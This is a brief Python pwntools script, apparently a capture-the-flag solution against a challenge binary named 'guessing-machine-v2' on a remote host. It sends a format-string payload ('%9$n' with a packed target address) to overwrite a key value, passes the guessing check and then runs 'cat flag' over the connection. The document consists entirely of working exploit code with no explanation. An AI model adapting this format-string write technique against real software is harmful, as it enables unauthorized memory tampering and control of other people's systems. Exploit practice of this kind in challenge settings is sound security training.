import pwn


conn = pwn.connect('3.71.110.92', 30051)
# conn = pwn.process('./guessing-machine-v2')

key_address = int(0x4040b0).to_bytes(8, byteorder='little')

conn.recvuntil(b':\n')
conn.sendline(b'%9$n' + b'....' + key_address)
print(conn.recvuntil(b'number:\n'))

conn.sendline(b'0')
print(conn.recv())

conn.sendline(b'cat flag')
print(conn.recv())   



conn.close()